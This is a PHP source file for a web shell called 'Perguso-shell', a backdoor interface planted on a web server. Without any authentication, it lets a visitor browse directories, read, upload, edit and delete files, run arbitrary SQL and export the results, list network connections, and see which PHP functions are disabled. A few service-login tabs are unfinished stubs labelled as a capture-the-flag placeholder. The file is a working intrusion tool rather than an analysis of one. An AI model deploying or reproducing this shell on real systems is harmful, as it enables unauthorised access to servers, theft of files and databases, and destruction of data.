<?php
session_start();
$current_path = isset($_GET["path"]) ? $_GET["path"] : getcwd();
chdir($current_path);
$cwd = getcwd();
$output = "";

function parseProcNet($proto) {
    $path = "/proc/net/" . $proto;
    if (!file_exists($path)) return [];
    $lines = file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    array_shift($lines);
    $res = [];
    foreach ($lines as $line) {
        $parts = preg_split('/\s+/', trim($line));
        if (count($parts) < 4) continue;
        $local = explode(":", $parts[1]);
        $remote = explode(":", $parts[2]);
        $state = $parts[3];
        $local_ip = long2ip(hexdec(strrev(chunk_split($local[0], 2, ''))));
        $remote_ip = long2ip(hexdec(strrev(chunk_split($remote[0], 2, ''))));
        $res[] = [
            "proto" => strtoupper($proto),
            "local_ip" => $local_ip,
            "local_port" => hexdec($local[1]),
            "remote_ip" => $remote_ip,
            "remote_port" => hexdec($remote[1]),
            "state" => $state
        ];
    }
    return $res;
}

if (isset($_POST["cmd"]) && !empty($_POST["cmd"])) {
    $target_file = $_POST["cmd"];
    if (is_file($target_file) && is_readable($target_file)) {
        $output = file_get_contents($target_file);
    } else {
        $output = "File not found or not readable.";
    }
}

if (isset($_FILES["upload"])) {
    $target = $cwd . DIRECTORY_SEPARATOR . basename($_FILES["upload"]["name"]);
    if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target)) {
        $upload_msg = "Uploaded: " . htmlspecialchars($_FILES["upload"]["name"]);
    } else {
        $upload_msg = "Upload failed.";
    }
}

if (isset($_GET["delete"])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET["delete"];
    if (is_file($target)) {
        unlink($target);
    } elseif (is_dir($target)) {
        rmdir($target);
    }
    header("Location: ?tab=shell&path=" . urlencode($cwd));
    exit;
}

if (isset($_POST["newfile"]) && !empty($_POST["newfile"])) {
    $newfile = $cwd . DIRECTORY_SEPARATOR . basename($_POST["newfile"]);
    if (!file_exists($newfile)) {
        file_put_contents($newfile, "");
        $newfile_msg = "Created: " . htmlspecialchars($_POST["newfile"]);
    } else {
        $newfile_msg = "File already exists.";
    }
}

$files = scandir($cwd);
$disabled_functions = ini_get("disable_functions");
if (!$disabled_functions) $disabled_functions = "None";
$tab = isset($_GET["tab"]) ? $_GET["tab"] : "shell";
if ($tab === "mysql" && isset($_POST["logout"])) {
    session_destroy();
    header("Location: ?tab=mysql&path=" . urlencode($cwd));
    exit;
}
echo "<!DOCTYPE html>
<html>
<head>
    <title>Perguso-shell</title>
    <style>
        body {background:#111; color:#0f0; font-family:monospace; margin:0; padding:10px; text-align:center;}
        a {text-decoration:none;}
        .file a {color:#0af;}
        .folder a {color:lime;}
        .file {color:#fff;}
        input, textarea {background:#000; color:#0f0; border:1px solid #0f0; font-family:monospace;}
        input[type=text] {width:250px;}
        input[type=submit], button {background:#111; color:#0f0; border:1px solid #0f0; padding:2px 8px; cursor:pointer; font-family:monospace;}
        input[type=submit]:hover, button:hover {background:#0f0; color:#000;}
        pre {background:#000; padding:10px; border:1px solid #0f0; white-space:pre-wrap; word-wrap:break-word; text-align:left;}
        .footer {position:fixed; bottom:5px; right:10px; font-size:12px; color:#888;}
        .menu {margin-bottom:10px;}
        .menu a {margin-right:15px; font-weight:bold;}
        .del {color:#f44; margin-left:6px; font-size:12px; text-decoration:none;}
        .del:hover {color:#f88;}
        .edit {color:#0f0; margin-left:6px; font-size:12px; text-decoration:none;}
        .edit:hover {color:#ff0;}
        ul {list-style:none; padding:0;}
    </style>
</head>
<body>
    <h2>Perguso-shell</h2>
    <div class=\"menu\">
        <a href='?tab=shell&path=" . urlencode($cwd) . "'>Shell</a>
        <a href='?tab=mysql&path=" . urlencode($cwd) . "'>MySQL</a>
        <a href='?tab=netstat&path=" . urlencode($cwd) . "'>Netstat</a>
        <a href='?tab=smtp&path=" . urlencode($cwd) . "'>SMTP</a>
        <a href='?tab=ftp&path=" . urlencode($cwd) . "'>FTP</a>
        <a href='?tab=ssh&path=" . urlencode($cwd) . "'>SSH</a>
        <form method='post' enctype='multipart/form-data' style='display:inline'>
            <input type='file' name='upload'>
            <input type='submit' value='Upload'>
        </form>
        <form method='post' style='display:inline'>
            <input type='text' name='newfile' placeholder='file'>
            <input type='submit' value='New file'>
        </form>
    </div>
";

if ($tab === "shell") {
    echo "<div><b>" . $cwd . "$</b></div>
    <form method=\"post\">
        <input type=\"text\" name=\"cmd\" placeholder=\"\" autofocus autocomplete=\"off\">
        <input type=\"submit\" value=\"Open\">
    </form>";
    if (!empty($output)) {
        echo "<pre>" . htmlspecialchars($output) . "</pre>";
    }
    if (isset($upload_msg)) {
        echo "<p>" . $upload_msg . "</p>";
    }
    if (isset($newfile_msg)) {
        echo "<p>" . $newfile_msg . "</p>";
    }
    echo "<h3>Files</h3><ul>";
    foreach ($files as $file) {
        if ($file === ".") continue;
        $full_path = $cwd . DIRECTORY_SEPARATOR . $file;
        if (is_dir($full_path)) {
            $link = htmlspecialchars($_SERVER["PHP_SELF"]) . "?tab=shell&path=" . urlencode($full_path);
            echo "<li class='folder'><a href=\"" . $link . "\">" . htmlspecialchars($file) . "</a>/";
        } else {
            $link = htmlspecialchars($_SERVER["PHP_SELF"]) . "?tab=shell&path=" . urlencode($cwd) . "&file=" . urlencode($file);
            echo "<li class=\"file\"><a href=\"" . $link . "\">" . htmlspecialchars($file) . "</a>";
        }
        $del = htmlspecialchars($_SERVER["PHP_SELF"]) . "?tab=shell&path=" . urlencode($cwd) . "&delete=" . urlencode($file);
        $edit = htmlspecialchars($_SERVER["PHP_SELF"]) . "?tab=shell&path=" . urlencode($cwd) . "&edit=" . urlencode($file);
        echo " <a class='del' href=\"$del\" onclick=\"return confirm('Delete " . htmlspecialchars($file) . "?');\">×</a>";
        if (is_file($full_path) && is_writable($full_path)) {
            echo " <a class='edit' href=\"$edit\">✎</a>";
        }
        echo "</li>";
    }
    echo "</ul>";

    if (isset($_GET["file"])) {
        $target_file = $cwd . DIRECTORY_SEPARATOR . $_GET["file"];
        if (is_file($target_file) && is_readable($target_file)) {
            echo "<h3>Viewing: " . htmlspecialchars($_GET["file"]) . "</h3>";
            echo "<pre>" . htmlspecialchars(file_get_contents($target_file)) . "</pre>";
        }
    }

    if (isset($_GET["edit"])) {
        $target_file = $cwd . DIRECTORY_SEPARATOR . $_GET["edit"];
        if (is_file($target_file) && is_writable($target_file)) {
            if (isset($_POST["newcontent"])) {
                file_put_contents($target_file, $_POST["newcontent"]);
                echo "<p style='color:lime'>Saved " . htmlspecialchars($_GET["edit"]) . "</p>";
            }
            $content = htmlspecialchars(file_get_contents($target_file));
            echo "<h3>Editing: " . htmlspecialchars($_GET["edit"]) . "</h3>";
            echo "<form method='post'>
                <textarea name='newcontent' rows='20' cols='80'>$content</textarea><br>
                <input type='submit' value='Save'>
            </form>";
        } else {
            echo "<p style='color:red'>Cannot edit this file.</p>";
        }
    }
}

if ($tab === "mysql") {
    if (isset($_POST["dbhost"], $_POST["dbuser"], $_POST["dbpass"], $_POST["dbname"])) {
        $_SESSION["dbhost"] = $_POST["dbhost"];
        $_SESSION["dbuser"] = $_POST["dbuser"];
        $_SESSION["dbpass"] = $_POST["dbpass"];
        $_SESSION["dbname"] = $_POST["dbname"];
    }
    if (isset($_SESSION["dbhost"], $_SESSION["dbuser"], $_SESSION["dbpass"], $_SESSION["dbname"])) {
        $mysqli = @new mysqli($_SESSION["dbhost"], $_SESSION["dbuser"], $_SESSION["dbpass"], $_SESSION["dbname"]);
        if ($mysqli->connect_error) {
            echo "<p style='color:red'>MySQL Error: " . htmlspecialchars($mysqli->connect_error) . "</p>";
            session_destroy();
        } else {
            echo "<p>Connected to <b>" . htmlspecialchars($_SESSION["dbname"]) . "</b> as <b>" . htmlspecialchars($_SESSION["dbuser"]) . "</b></p>";
            if (!empty($_POST["sql"])) {
                $sql = $_POST["sql"];
                $download = isset($_POST["download"]);
                $result = $mysqli->query($sql);
                if ($result instanceof mysqli_result) {
                    if ($download) {
                        header("Content-Type: text/csv");
                        header("Content-Disposition: attachment; filename=\"query_result.csv\"");
                        $out = fopen("php://output", "w");
                        $fields = [];
                        while ($field = $result->fetch_field()) {
                            $fields[] = $field->name;
                        }
                        fputcsv($out, $fields);
                        while ($row = $result->fetch_assoc()) {
                            fputcsv($out, $row);
                        }
                        fclose($out);
                        exit;
                    } else {
                        echo "<table border='1' cellpadding='5'><tr>";
                        while ($field = $result->fetch_field()) {
                            echo "<th>" . htmlspecialchars($field->name) . "</th>";
                        }
                        echo "</tr>";
                        while ($row = $result->fetch_assoc()) {
                            echo "<tr>";
                            foreach ($row as $col) {
                                echo "<td>" . htmlspecialchars($col) . "</td>";
                            }
                            echo "</tr>";
                        }
                        echo "</table>";
                    }
                } elseif ($result === true) {
                    echo "<p>Query executed.</p>";
                } else {
                    echo "<p>Error: " . htmlspecialchars($mysqli->error) . "</p>";
                }
            }
            echo "<form method='post'>
                <textarea name='sql' rows='5' cols='60' placeholder='SQL query'></textarea><br>
                <label><input type='checkbox' name='download'> Download file</label><br>
                <input type='submit' value='Execute'>
            </form>";
            echo "<form method='post'><input type='hidden' name='logout' value='1'><input type='submit' value='Disconnect'></form>";
        }
    } else {
        echo "<form method='post'>
            <input type='text' name='dbhost' placeholder='host' value='localhost'><br>
            <input type='text' name='dbuser' placeholder='user'><br>
            <input type='text' name='dbpass' placeholder='password'><br>
            <input type='text' name='dbname' placeholder='database'><br>
            <input type='submit' value='Connect'>
        </form>";
    }
}

if ($tab === "netstat") {
    echo "<h3>Active Connections</h3>";
    $conns = array_merge(parseProcNet("tcp"), parseProcNet("udp"));
    $seen = [];
    if (empty($conns)) {
        echo "<p>No connections found.</p>";
    } else {
        echo "<table border=1 cellpadding=5><tr><th>Proto</th><th>Local</th><th>Remote</th><th>State</th></tr>";
        foreach ($conns as $c) {
            $key = implode("|", $c);
            if (isset($seen[$key])) continue;
            $seen[$key] = true;
            echo "<tr><td>{$c['proto']}</td>
                  <td>{$c['local_ip']}:{$c['local_port']}</td>
                  <td>{$c['remote_ip']}:{$c['remote_port']}</td>
                  <td>{$c['state']}</td></tr>";
        }
        echo "</table>";
    }
}

foreach (["smtp","ftp","ssh"] as $service) {
    if ($tab === $service) {
        echo "<h3>".strtoupper($service)." Login</h3>";
        echo "<form method='post'>
          <input type='text' name='host' placeholder='host'><br>
          <input type='text' name='port' placeholder='port'><br>
          <input type='text' name='user' placeholder='username'><br>
          <input type='text' name='pass' placeholder='password'><br>
          <input type='submit' value='Connect'>
        </form>";
        if ($_SERVER['REQUEST_METHOD']==='POST') {
            echo "<p>[!] Connection logic for $service not implemented (CTF placeholder).</p>";
        }
    }
}

echo "<div class=\"footer\">Disabled functions: " . htmlspecialchars($disabled_functions) . "</div>
</body>
</html>";